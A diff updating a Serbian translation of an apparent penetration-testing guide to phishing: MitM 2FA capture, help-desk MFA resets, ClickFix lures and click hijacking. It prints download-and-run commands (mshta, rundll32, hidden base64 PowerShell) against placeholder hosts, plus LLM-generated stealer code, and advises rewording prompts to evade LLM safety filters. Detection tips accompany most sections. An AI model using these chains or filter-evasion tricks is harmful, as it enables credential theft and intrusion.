+Prethodni napad je prilično domišljat jer se predstavljate kao pravi veb-sajt i prikupljate podatke koje korisnik unese. Nažalost, ako korisnik ne unese ispravnu lozinku ili ako je aplikacija koju ste lažirali podešena sa 2FA, **ovi podaci vam neće omogućiti da se predstavljate kao prevareni korisnik**.
 
-Ovde su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat vam omogućava da izvedete napad nalik MitM napadu. Napad se u osnovi odvija na sledeći način:
+Tu su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat omogućava izvođenje napada nalik MitM-u. Napad u osnovi funkcioniše ovako:
 
-1. **Imitiraćete login** formu stvarne web stranice.
-2. Korisnik **šalje** svoje **credentials** na vašu lažnu stranicu, a alat ih prosleđuje stvarnoj web stranici, **proveravajući da li credentials funkcionišu**.
-3. Ako je nalog podešen sa **2FA**, MitM stranica će zatražiti 2FA, a kada ga **korisnik unese**, alat će ga proslediti stvarnoj web stranici.
-4. Kada se korisnik autentifikuje, vi ćete (kao attacker) imati **captured credentials, 2FA, cookie i sve informacije** iz svake interakcije tokom izvođenja MitM napada.
+1. **Predstavljate se kao obrazac za prijavu** na pravoj veb-stranici.
+2. Korisnik **šalje** svoje **akreditive** na vašu lažnu stranicu, a alat ih šalje pravoj veb-stranici i **proverava da li akreditivi važe**.
+3. Ako je nalog podešen sa **2FA**, MitM stranica će zatražiti kod; kada ga **korisnik unese**, alat će ga poslati pravoj veb-stranici.
+4. Kada se korisnik autentifikuje, vi ćete kao napadač **prikupiti akreditive, 2FA kod, kolačić i sve informacije iz svake njegove interakcije dok alat izvodi MitM napad**.
 
-### Via VNC
+### Preko VNC-a
 
-Šta ako, umesto da **pošaljete žrtvu na malicioznu stranicu** koja izgleda isto kao originalna, pošaljete žrtvu u **VNC sesiju sa browserom povezanim na stvarnu web stranicu**? Moći ćete da vidite šta radi, ukradete lozinku, korišćeni MFA, cookies...\
-To možete uraditi pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>
+Šta ako žrtvu, umesto da je **pošaljete na zlonamernu stranicu** koja izgleda kao originalna, pošaljete na **VNC sesiju sa pregledačem povezanim sa pravom veb-stranicom**? Moći ćete da vidite šta radi i ukradete lozinku, korišćeni MFA, kolačiće...\
+To možete da uradite pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>
 
-## Otkrivanje detekcije
+## Otkrivanje da ste otkriveni
 
-Očigledno, jedan od najboljih načina da saznate da li ste otkriveni jeste da **pretražite svoj domen unutar blacklists**. Ako se pojavi na listi, to znači da je vaš domen na neki način detektovan kao sumnjiv.\
-Jedan jednostavan način da proverite da li se vaš domen pojavljuje na nekoj blacklisti jeste korišćenje [https://malwareworld.com/](https://malwareworld.com)
+Očigledno, jedan od najboljih načina da saznate da li ste raskrinkani jeste da **proverite da li se vaš domen nalazi na crnim listama**. Ako se tamo nalazi, znači da je vaš domen nekako označen kao sumnjiv.\
+Jednostavan način da proverite da li se vaš domen nalazi na nekoj crnoj listi jeste da koristite [https://malwareworld.com/](https://malwareworld.com)
 
-Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjivu phishing aktivnost u wild-u**, kao što je objašnjeno u:
+Postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjive phishing aktivnosti u javno dostupnom prostoru**, kao što je objašnjeno na:
 
 
 {{#ref}}
 detecting-phising.md
 {{#endref}}
 
-Možete **kupiti domen sa veoma sličnim imenom** domenu žrtve **i/ili generisati certificate** za **subdomain** domena koji vi kontrolišete, a koji **sadrži** **keyword** domena žrtve. Ako **žrtva** izvrši bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma stealth.<sup>[[2]](#references)</sup>
+Možete da **kupite domen sa imenom veoma sličnim domenu žrtve** i/ili da **generišete sertifikat** za **poddomen** domena koji kontrolišete, a koji **sadrži** **ključnu reč** iz domena žrtve. Ako žrtva ostvari bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma neprimetni.<sup>[[2]](#references)</sup>
 
-### Procena phishing-a
+### Procena phishing imejla
 
-Koristite [**Phishious** ](https://github.com/Rices/Phishious)da procenite da li će vaš email završiti u spam folderu, biti blokiran ili uspešno isporučen.
+Koristite [**Phishious** ](https://github.com/Rices/Phishious)da biste procenili da li će vaš imejl završiti u folderu za neželjenu poštu, biti blokiran ili uspešno isporučen.
 
-## High-Touch Identity Compromise (Help-Desk MFA Reset)
+## Kompromitovanje identiteta uz direktan kontakt (resetovanje MFA preko help deska)
 
-Modern intrusion sets sve češće potpuno preskaču email lure-ove i **direktno ciljaju service-desk / identity-recovery workflow** kako bi zaobišli MFA. Napad se u potpunosti oslanja na "living-off-the-land": kada operator preuzme validne credentials, prelazi dalje koristeći ugrađene admin alate – malware nije potreban.<sup>[[6]](#references)</sup>
+Savremeni skupovi upada sve češće u potpunosti zaobilaze imejl mamce i **direktno ciljaju tokove rada službe za podršku / oporavka identiteta** kako bi zaobišli MFA. Napad se u potpunosti oslanja na „living-off-the-land“ pristup: kada napadač preuzme važeće akreditive, nastavlja napad pomoću ugrađenih administratorskih alata — malware nije potreban.<sup>[[6]](#references)</sup>
 
-### Attack flow
-1. Recon žrtve
-* Prikupite lične i korporativne podatke sa LinkedIn-a, iz data breach-eva, javnog GitHub-a itd.
-* Identifikujte identitete visoke vrednosti (rukovodioce, IT, finansije) i utvrdite **tačan help-desk proces** za resetovanje lozinke / MFA-a.
-2. Real-time social engineering
-* Pozovite help-desk telefonom, preko Teams-a ili chata, predstavljajući se kao meta (često uz **spoofed caller-ID** ili **cloned voice**).
-* Dostavite prethodno prikupljene PII podatke kako biste prošli verifikaciju zasnovanu na znanju.
-* Ubedite agenta da **resetuje MFA secret** ili izvrši **SIM-swap** registrovanog mobilnog broja.
-3. Immediate post-access actions (≤60 min in real cases)
-* Uspostavite foothold kroz bilo koji web SSO portal.
-* Enumerišite AD / AzureAD pomoću ugrađenih alata (bez ubacivanja binaries):
-```powershell
-# list directory groups & privileged roles
-Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}
+### Tok napada
+1. Istražite žrtvu
+   * Prikupite lične i poslovne podatke sa LinkedIn-a, iz curenja podataka, javnog GitHub-a itd.
+   * Identifikujte identitete visoke vrednosti (rukovodioce, IT osoblje, finansijsko osoblje) i utvrdite **tačan postupak help deska** za resetovanje lozinke / MFA.
+2. Društveni inženjering u realnom vremenu
+   * Pozovite help desk, kontaktirajte ga preko Teams-a ili četovanja i lažno se predstavite kao meta (često uz **lažiranje ID-a pozivaoca** ili **klonirani glas**).
+   * Navedite prethodno prikupljene lične podatke kako biste prošli proveru identiteta zasnovanu na znanju.
+   * Ubedite operatera da **resetuje MFA tajnu** ili izvrši **SIM swap** registrovanog mobilnog broja.
+3. Neposredne aktivnosti nakon pristupa (≤60 min u stvarnim slučajevima)
+   * Uspostavite uporište preko bilo kog veb-portala za SSO.
+   * Nabrojte AD / AzureAD pomoću ugrađenih alata (bez ispuštanja binarnih fajlova):
+     ```powershell
+     # list directory groups & privileged roles
+     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}
 
-# AzureAD / Graph – list directory roles
-Get-MgDirectoryRole | ft DisplayName,Id
+     # AzureAD / Graph – list directory roles
+     Get-MgDirectoryRole | ft DisplayName,Id
 
-# Enumerate devices the account can login to
-Get-MgUserRegisteredDevice -UserId <user@corp.local>
-```
-* Izvršite lateral movement pomoću **WMI**, **PsExec** ili legitimnih **RMM** agenata koji su već whitelisted u okruženju.
+     # Enumerate devices the account can login to
+     Get-MgUserRegisteredDevice -UserId <user@corp.local>
+     ```
+   * Lateralno kretanje pomoću **WMI**, **PsExec** ili legitimnih **RMM** agenata koji su već na allowlisti u okruženju.
 
-### Detection & Mitigation
-* Tretirajte help-desk identity recovery kao **privileged operation** – zahtevajte step-up auth i odobrenje menadžera.
-* Implementirajte **Identity Threat Detection & Response (ITDR)** / **UEBA** pravila koja generišu alert za:
-* Promenjen MFA method + authentication sa novog uređaja / geolokacije.
-* Neposrednu eskalaciju istog principala (user-→-admin).
-* Snimajte help-desk pozive i zahtevajte **call-back na već registrovani broj** pre bilo kakvog reseta.
-* Implementirajte **Just-In-Time (JIT) / Privileged Access** kako novoresetovani nalozi ne bi automatski nasledili high-privilege tokene.
+### Detekcija i ublažavanje
+* Tretirajte oporavak identiteta preko help-deska kao **privilegovanu operaciju** – zahtevajte dodatnu autentifikaciju (step-up auth) i odobrenje menadžera.
+* Uvedite pravila za **Identity Threat Detection & Response (ITDR)** / **UEBA** koja šalju upozorenja za:  
+  * Promenu MFA metode + autentifikaciju sa novog uređaja / lokacije.  
+  * Neposredno podizanje privilegija istog principal-a (korisnik-→-admin).  
+* Snimajte pozive help-desku i zahtevajte **uzvratni poziv na već registrovani broj** pre bilo kakvog resetovanja.
+* Uvedite **Just-In-Time (JIT) / Privileged Access** kako resetovani nalozi ne bi automatski dobijali tokene sa visokim privilegijama.
 
 ---
 
-## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
-Commodity crews nadoknađuju troškove high-touch operacija masovnim napadima koji **pretvaraju search engines i ad networks u delivery channel**.<sup>[[6]](#references)</sup>
+## Obmana velikih razmera – SEO Poisoning i „ClickFix“ kampanje
+Grupe koje koriste široko dostupne alate nadoknađuju troškove ciljanih operacija masovnim napadima koji **pretraživače i oglasne mreže pretvaraju u kanal za isporuku**.<sup>[[6]](#references)</sup>
 
-1. **SEO poisoning / malvertising** gura lažni rezultat, kao što je `chromium-update[.]site`, na vrh search oglasa.
-2. Žrtva preuzima mali **first-stage loader** (često JS/HTA/ISO). Primeri koje je video Unit 42:
-* `RedLine stealer`
-* `Lumma stealer`
-* `Lampion Trojan`
-3. Loader eksfiltrira browser cookies + credential DBs, a zatim preuzima **silent loader** koji *u realnom vremenu* odlučuje da li će implementirati:
-* RAT (npr. AsyncRAT, RustDesk)
-* ransomware / wiper
-* persistence component (registry Run key + scheduled task)
+1. **SEO poisoning / malvertising** postavlja lažni rezultat, kao što je `chromium-update[.]site`, na vrh oglasa u rezultatima pretrage.
+2. Žrtva preuzima mali **loader prve faze** (često JS/HTA/ISO). Primeri koje je zabeležio Unit 42:
+   * `RedLine stealer`
+   * `Lumma stealer`
+   * `Lampion Trojan`
+3. Loader eksfiltruje kolačiće pregledača i baze podataka akreditiva, a zatim preuzima **tihi loader** koji *u realnom vremenu* odlučuje da li će instalirati:
+   * RAT (npr. AsyncRAT, RustDesk)
+   * ransomware / wiper
+   * komponentu za postojanost (ključ Run u registru + zakazani zadatak)
 
-### Hardening tips
-* Blokirajte novoregistrovane domene i primenite **Advanced DNS / URL Filtering** i na *search-ads*, kao i na email.
-* Ograničite instalaciju software-a na potpisane MSI / Store pakete; pravilima zabranite izvršavanje `HTA`, `ISO`, `VBS` fajlova.
-* Nadgledajte child procese browsera koji otvaraju installere:
-```yaml
-- parent_image: /Program Files/Google/Chrome/*
-and child_image: *\\*.exe
-```
-* Istražujte LOLBins koji se često zloupotrebljavaju u first-stage loader-ima (npr. `regsvr32`, `curl`, `mshta`).
+### Saveti za ojačavanje bezbednosti
+* Blokirajte novoregistrovane domene i primenite **Advanced DNS / URL Filtering** na *oglase u pretrazi*, kao i na e-poštu.
+* Ograničite instalaciju softvera na potpisane MSI / Store pakete, a pravilima zabranite izvršavanje `HTA`, `ISO`, `VBS` fajlova.
+* Pratite podređene procese pregledača koji pokreću instalacione programe:
+  ```yaml
+  - parent_image: /Program Files/Google/Chrome/*
+    and child_image: *\\*.exe
+  ```
+* Tražite LOLBins koje često zloupotrebljavaju loaderi prve faze (npr. `regsvr32`, `curl`, `mshta`).
 
-### Hijacking klikova na dugme za preuzimanje uz TDS handoff
-Neki lažni software portali ostavljaju vidljivi download `href` koji pokazuje na **stvarni GitHub/release URL**, ali pomoću JavaScript-a preusmeravaju **prvu** interakciju korisnika i umesto toga šalju žrtvu u lanac **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
+### Preotimanje klika na dugme za preuzimanje uz prosleđivanje TDS-u
+Neki lažni softverski portali ostavljaju vidljivi `href` za preuzimanje usmeren na **pravi** GitHub/URL izdanja, ali JavaScript-om preotimaju **prvu** korisničku interakciju i šalju žrtvu u lanac **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
+
 ```javascript
 const cachedOpen = window.open;
 document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
-if (!isEligibleClick(e.target)) return;
-cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
-e.stopImmediatePropagation();
-e.preventDefault();
+  if (!isEligibleClick(e.target)) return;
+  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
+  e.stopImmediatePropagation();
+  e.preventDefault();
 }, true);
 ```
-Ključne karakteristike:
-- Hook se obično izvršava u **capture fazi** (`true`) na objektu `document`, tako da se pokreće pre handlera sajta.
-- Chrome često koristi `mousedown` umesto `click` kako bi preusmeravanje ostalo povezano sa važećom **korisničkom radnjom** i poboljšalo zaobilaženje blokatora iskačućih prozora.
-- Neke varijante unapred otvaraju `about:blank` ili simuliraju klikove na `<a target="_blank">`, a URL TDS-a dodeljuju tek kasnije.
-- Ograničenja na strani browsera često se čuvaju u `localStorage`, pa **prvi klik** može odvesti do malware-a, dok se osvežavanja/pokušaji ponovo preusmeravaju na bezopasnu, vidljivu vezu.
-- TDS može filtrirati prema referreru, ulaznom domenu, GEO lokaciji, fingerprintu browsera/uređaja, proverama VPN/datacentar, kontekstu klika i brojačima po sesiji, zbog čega ponovljene analize mogu davati nedeterminističke rezultate.
+
+Ključne osobine:
+- Hook se obično izvršava u **capture fazi** (`true`) na objektu `document`, pa se aktivira pre handlera sajta.
+- Chrome često koristi `mousedown` umesto `click` da bi preusmeravanje bilo povezano sa važećim **korisničkim gestom** i da bi se povećala verovatnoća zaobilaženja blokatora iskačućih prozora.
+- Neke varijante unapred otvaraju `about:blank` ili simuliraju klikove na `<a target="_blank">`, pa tek kasnije postavljaju TDS URL.
+- Ograničenja na strani browsera često se čuvaju u `localStorage`, pa **prvi klik** može da vodi do malware-a, dok se pri osvežavanju stranice ili ponovnim pokušajima koristi bezbedno izgledajući vidljivi link.
+- TDS može da proverava referrer, ulazni domen, GEO, otisak browsera/uređaja, VPN/datacenter, kontekst klika i brojače po sesiji, zbog čega ponovljena analitička testiranja daju nepredvidive rezultate.
 
 Ideje za odbranu:
-- Uporedite **prikazani** `href` sa **stvarnim** odredištem navigacije koje se generiše u trenutku klika.
-- Tražite handlere `document.addEventListener(..., true)` koji pozivaju i `preventDefault()` i `stopImmediatePropagation()` u blizini poziva `window.open`, `about:blank` ili simuliranih klikova na anchor elemente.
-- Grupe novoregistrovanih domena za preuzimanje softvera koji svi učitavaju isti CloudFront/JS stage tretirajte kao obrazac SEO trovanja/TDS-a sa visokim signalom.
+- Uporedite prikazani `href` sa stvarnim ciljem navigacije koji se generiše u trenutku klika.
+- Tražite handlere `document.addEventListener(..., true)` koji pozivaju i `preventDefault()` i `stopImmediatePropagation()` oko `window.open`, `about:blank` ili simuliranih klikova na anchor elemente.
+- Grupe novo registrovanih domena za preuzimanje softvera koji svi učitavaju isti CloudFront/JS stage predstavljaju snažan signal za SEO trovanje/TDS obrazac.
 
 ### ClickFix sa lažnih stranica za verifikaciju + LOLBAS preuzimanja koja izgledaju kao arhive
-Neke TDS grane završavaju na lažnoj stranici za verifikaciju (u stilu Cloudflare/IUAM) koja žrtvi govori da pokrene pouzdani Windows binarni fajl, kao što je:<sup>[[9]](#references)</sup>
+Neke grane TDS-a vode do lažne stranice za verifikaciju (u stilu Cloudflare/IUAM), koja nalaže žrtvi da pokrene pouzdan Windows binarni fajl kao što je:<sup>[[9]](#references)</sup>
+
 ```cmd
 C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
 ```
-Napomene:
-- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako se URL predstavlja kao `.7z` arhiva; dodati podaci arhive mogu biti čista varka.
-- Naredne faze često nastavljaju da lažno prikazuju tip datoteke (`.rtf` za PowerShell, `.asar` za Python, ZIP arhive sa binarnim datotekama dopunjenim paddingom), a zatim prelaze na **manual PE mapping / in-memory execution**.
-- Ako odgovarate na jedan od ovih lanaca, sačuvajte **mrežu + memoriju od prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo bezopasnu putanju instalera/SFX-a ili neuspešno završiti jer su payload/key release vezani za originalnu TDS sesiju.
 
-### ClickFix DLL delivery tradecraft (lažno CERT ažuriranje)
-* Mamac: klonirano obaveštenje nacionalnog CERT-a sa dugmetom **Update**, koje prikazuje detaljna uputstva za „popravku“. Od žrtava se traži da pokrenu batch koji preuzima DLL i izvršava ga putem `rundll32`.<sup>[[12]](#references)</sup>
-* Uobičajeni batch chain:
-```cmd
-echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
-echo timeout /t 10
-echo rundll32.exe "%TEMP%\notepad2.dll",notepad
-```
-* `Invoke-WebRequest` upisuje payload u `%TEMP%`, kratko čekanje prikriva mrežni jitter, a zatim `rundll32` poziva exportovani entrypoint (`notepad`).
-* DLL šalje beacon sa identitetom hosta i proverava C2 svakih nekoliko minuta. Udaljeni tasking stiže kao **base64-enkodovani PowerShell**, koji se izvršava skriveno i uz zaobilaženje policy-ja:
-```powershell
-powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
-```
-* Ovo zadržava fleksibilnost C2-a (server može da menja taskove bez ažuriranja DLL-a) i skriva prozore konzole. Potražite PowerShell procese-child procese `rundll32.exe` koji zajedno koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
-* Defenders mogu da traže HTTP(S) callback zahteve oblika `...page.php?tynor=<COMPUTER>sss<USER>` i intervale polling-a od 5 minuta nakon učitavanja DLL-a.
+Napomene:
+- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako se URL predstavlja kao `.7z` arhiva; naknadno dodati podaci arhive mogu biti samo mamac.
+- Naredne faze često i dalje lažno prikazuju tip datoteke (`.rtf` za PowerShell, `.asar` za Python, ZIP arhive sa binarnim datotekama dopunjenim do veće veličine), a zatim prelaze na **ručno mapiranje PE-a / izvršavanje u memoriji**.
+- Ako reagujete na jedan od ovih lanaca, sačuvajte **mrežni saobraćaj i memoriju od prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo bezazleni put instalacionog programa/SFX-a ili ne uspeti jer je isporuka payload-a/ključa bila vezana za originalnu TDS sesiju.
+
+### Taktike isporuke ClickFix DLL-a (lažno CERT ažuriranje)
+* Mamac: klonirano saopštenje nacionalnog CERT-a sa dugmetom **Update** koje prikazuje detaljna uputstva za „popravku“. Žrtvama se nalaže da pokrenu batch skriptu koja preuzima DLL i izvršava ga pomoću `rundll32`.<sup>[[12]](#references)</sup>
+* Uočeni tipični batch lanac:
+  ```cmd
+  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
+  echo timeout /t 10
+  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
+  ```
+  * `Invoke-WebRequest` preuzima payload u `%TEMP%`, kratko čekanje prikriva mrežni jitter, a zatim `rundll32` poziva izvezenu ulaznu tačku (`notepad`).
+* DLL šalje identitet hosta i proverava C2 svakih nekoliko minuta. Udaljene komande stižu kao **base64-encoded PowerShell** i izvršavaju se skriveno, uz zaobilaženje policy-ja:
+  ```powershell
+  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
+  ```
+  * Ovo čuva fleksibilnost C2 (server može da zameni zadatke bez ažuriranja DLL-a) i skriva prozore konzole. Potražite PowerShell procese-potomke procesa `rundll32.exe` koji zajedno koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
+* Branioci mogu da traže HTTP(S) callback-ove oblika `...page.php?tynor=<COMPUTER>sss<USER>` i intervale provere od 5 minuta nakon učitavanja DLL-a.
 
 ---
 
-## Phishing operacije unapređene pomoću AI-ja
-Napadači sada kombinuju **LLM & voice-clone API-je** za potpuno personalizovane mamce i interakciju u realnom vremenu.
+## Phishing operacije unapređene AI-jem
+Napadači sada kombinuju **LLM i API-je za kloniranje glasa** kako bi kreirali potpuno personalizovane mamce i ostvarili interakciju u realnom vremenu.
 
-| Sloj | Primer upotrebe od strane threat actora |
-|-------|-------------|
-|Automation|Generisanje i slanje više od 100 hiljada emailova / SMS poruka sa nasumično izmenjenim tekstom i tracking linkovima.|
-|Generative AI|Kreiranje *jednokratnih* emailova koji se pozivaju na javne M&A događaje i interne šale sa društvenih mreža; deep-fake glasa CEO-a u callback scam-u.|
-|Agentic AI|Autonomna registracija domena, prikupljanje open-source intel podataka i sastavljanje narednih emailova kada žrtva klikne, ali ne pošalje credentials.|
+| Sloj | Primer upotrebe od strane aktera pretnje |
+|-------|-----------------------------|
+|Automatizacija|Generisanje i slanje više od 100 hiljada e-poruka / SMS poruka sa nasumično izmenjenim tekstom i linkovima za praćenje.|
+|Generativna AI|Kreiranje *jednokratnih* e-poruka koje pominju javne M&A poslove i interne šale sa društvenih mreža; deep-fake glas direktora u prevarama s povratnim pozivom.|
+|Agentna AI|Autonomno registrovanje domena, prikupljanje obaveštajnih podataka iz javnih izvora i sastavljanje narednih e-poruka kada žrtva klikne, ali ne unese creds.|
 
-**Odbrana:**
-• Dodajte **dinamičke bannere** koji ističu poruke poslate iz nepouzdane automatizacije (putem ARC/DKIM anomalija).
-• Uvedite **voice-biometric challenge fraze** za telefonske zahteve visokog rizika.
-• Kontinuirano simulirajte AI-generisane mamce u programima podizanja svesti – statični template-i su zastareli.
+**Odbrana:**  
+• Dodajte **dinamičke banere** koji ističu poruke poslate nepouzdanom automatizacijom (putem anomalija u ARC/DKIM-u).  
+• Uvedite **fraze za proveru glasovnom biometrijom** za telefonske zahteve visokog rizika.  
+• Neprestano simulirajte AI-generisane mamce u programima podizanja svesti – statični predlošci su zastareli.
 
-Pogledajte i – zloupotrebu agentic browsing-a za credential phishing:
+Pogledajte i – zloupotrebu agentnog pregledanja za phishing radi krađe kredencijala:
 
 {{#ref}}
 ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
 {{#endref}}
 
-Pogledajte i – zloupotrebu AI agent-a za lokalne CLI alate i MCP (za inventar secrets-a i detekciju):
+Pogledajte i – zloupotrebu lokalnih CLI alata i MCP-a od strane AI agenata (za inventarisanje tajni i detekciju):
 
 {{#ref}}
 ai-agent-abuse-local-ai-cli-tools-and-mcp.md
 {{#endref}}
 
-## LLM-assisted runtime assembly phishing JavaScript-a (in-browser codegen)
+## Sklapanje phishing JavaScript-a tokom izvršavanja uz pomoć LLM-a (codegen u pregledaču)
 
-Napadači mogu da isporuče HTML koji izgleda bezopasno i da **generišu steal­er tokom runtime-a** tako što od **trusted LLM API-ja** zatraže JavaScript, a zatim ga izvrše u browseru (npr. `eval` ili dinamički `<script>`).<sup>[[8]](#references)</sup>
+Napadači mogu da isporuče HTML koji izgleda bezazleno i **generišu stealer tokom izvršavanja** tako što zatraže JavaScript od **pouzdanog LLM API-ja**, a zatim ga izvrše u pregledaču (npr. pomoću `eval` ili dinamičkog `<script>`).<sup>[[8]](#references)</sup>
 
-1. **Prompt-as-obfuscation:** kodirajte exfil URL-ove/Base64 stringove u promptu; iterirajte formulaciju da biste zaobišli safety filtere i smanjili halucinacije.
-2. **Client-side API call:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/itd.) ili CDN proxy; u statičkom HTML-u prisutni su samo prompt/API poziv.
-3. **Assemble & exec:** konkatenirajte odgovor i izvršite ga (polimorfno pri svakoj poseti):
+1. **Prompt kao tehnika zaobilaženja:** enkodirajte URL-ove za eksfiltraciju/Base64 nizove u promptu; menjajte formulaciju da biste zaobišli bezbednosne filtere i smanjili halucinacije.
+2. **API poziv sa strane klijenta:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/itd.) ili CDN proxy; u statičkom HTML-u prisutan je samo prompt/API poziv.
+3. **Sklapanje i izvršavanje:** konkatenirajte odgovor i izvršite ga (polimorfno pri svakoj poseti):
+
 ```javascript
 fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
-.then(r=>r.json())
-.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
+  .then(r=>r.json())
+  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
 ```
-4. **Phish/exfil:** generisani kod personalizuje mamac (npr. parsiranje LogoKit tokena) i šalje kredencijale na endpoint skriven u promptu.
 
-**Evasion traits**
-- Saobraćaj dolazi do poznatih LLM domena ili pouzdanih CDN proxy servera; ponekad putem WebSockets-a do backend-a.
-- Nema statičkog payload-a; maliciozni JS postoji samo nakon renderovanja.
-- Nedeterminističke generacije proizvode **jedinstvene stealers-e** za svaku sesiju.
+4. **Phish/exfil:** generisani kod personalizuje mamac (npr. parsiranje LogoKit tokena) i šalje kredencijale na endpoint sakriven u promptu.
 
-**Detection ideas**
-- Pokrenite sandbox okruženja sa omogućenim JS-om; označite **runtime `eval`/kreiranje dinamičkih skripti čiji je izvor LLM odgovor**.
-- Tražite front-end POST zahteve ka LLM API-jima, neposredno praćene pozivima `eval`/`Function` nad vraćenim tekstom.
-- Upozorite na neodobrene LLM domene u klijentskom saobraćaju, praćene slanjem kredencijala putem POST zahteva.
+**Osobine izbegavanja detekcije**
+- Saobraćaj ide ka poznatim LLM domenima ili pouzdanim CDN proxy-jima; ponekad preko WebSockets veze sa backendom.
+- Nema statičkog payload-a; zlonamerni JS postoji tek nakon renderovanja.
+- Nedeterminističke generacije stvaraju **jedinstvene** stealere za svaku sesiju.
+
+**Ideje za detekciju**
+- Pokrećite sandbox okruženja sa omogućenim JS-om; označite **`eval` tokom izvršavanja / dinamičko kreiranje skripti iz LLM odgovora**.
+- Tražite front-end POST zahteve ka LLM API-jima, po kojima odmah slede `eval`/`Function` nad vraćenim tekstom.
+- Generišite upozorenje za neodobrene LLM domene u saobraćaju klijenta, a zatim i za naknadne POST zahteve sa kredencijalima.
 
 ---
 
-## MFA Fatigue / Push Bombing Variant – Forced Reset
-Pored klasičnog push-bombing-a, operateri jednostavno **forsiraju novu MFA registraciju** tokom poziva help-desku, čime poništavaju korisnikov postojeći token.  Svaki naredni login prompt žrtvi izgleda legitimno.
+## MFA Fatigue / Push Bombing varijanta – prinudno resetovanje
+Pored klasičnog push-bombing-a, operater jednostavno **prisilno pokreće novu MFA registraciju** tokom poziva help desku, čime poništava postojeći token korisnika. Svaki naredni zahtev za prijavu žrtvi deluje legitimno.
+
 ```text
 [Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
 [Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
 [Attacker]  →  Completes new TOTP enrolment on their own device
 ```
-Pratite događaje u AzureAD/AWS/Okta gde se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.
+
+Pratite AzureAD/AWS/Okta događaje u kojima se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.
 
 
 
 ## Clipboard Hijacking / Pastejacking
 
-Napadači mogu neprimetno kopirati zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted web stranice, a zatim navesti korisnika da ih nalepi u **Win + R**, **Win + X** ili terminal, čime se izvršava proizvoljan kod bez ikakvog download-a ili attachment-a.
+Napadači mogu neprimetno da kopiraju zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted veb-stranice, a zatim prevare korisnika da ih nalepi u **Win + R**, **Win + X** ili prozor terminala, čime se izvršava proizvoljan kod bez preuzimanja ili priloga.
 
 
 {{#ref}}
 clipboard-hijacking.md
 {{#endref}}
 
-## Mobile Phishing i Malicious App Distribution (Android i iOS)
+## Mobilni phishing i distribucija zlonamernih aplikacija (Android i iOS)
 
 
 {{#ref}}
 mobile-phishing-malicious-apps.md
 {{#endref}}
 
-### WhatsApp device-linking hijack via QR social engineering
-* Lure stranica (npr. lažni “channel” ministarstva/CERT-a) prikazuje WhatsApp Web/Desktop QR i nalaže žrtvi da ga skenira, čime se napadač neprimetno dodaje kao **linked device**.<sup>[[12]](#references)</sup>
-* Napadač odmah dobija uvid u chatove/kontakte sve dok se sesija ne ukloni. Žrtve kasnije mogu videti obaveštenje “new device linked”; defenders mogu tražiti neočekivane device-link događaje ubrzo nakon poseta nepouzdanim QR stranicama.
+### Otimanje povezivanja WhatsApp uređaja putem QR koda i social engineering-a
+* Stranica-mamac (npr. lažni „kanal” ministarstva/CERT-a) prikazuje QR kod za WhatsApp Web/Desktop i upućuje žrtvu da ga skenira, čime se napadač neprimetno dodaje kao **povezani uređaj**.<sup>[[12]](#references)</sup>
